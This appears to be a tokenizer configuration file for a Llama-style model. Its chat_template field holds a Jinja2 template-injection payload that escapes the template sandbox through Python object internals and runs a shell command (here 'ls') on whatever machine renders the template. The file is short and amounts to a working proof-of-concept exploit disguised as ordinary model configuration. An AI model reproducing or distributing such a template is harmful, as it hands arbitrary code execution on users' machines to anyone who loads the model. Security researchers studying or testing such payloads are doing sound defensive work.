{
  "tokenizer_class": "LlamaTokenizer",
  "model_max_length": 2048,
  "chat_template": "{% for x in ().__class__.__base__.__subclasses__() %} {% if \"warning\" in x.__name__ %} {{x()._module.__builtins__['__import__']('os').popen(\"ls\").read()}} {%endif%} {%endfor%}",
  "bos_token": "<s>",
  "eos_token": "</s>",
  "pad_token": null,
  "unk_token": "<unk>"
}
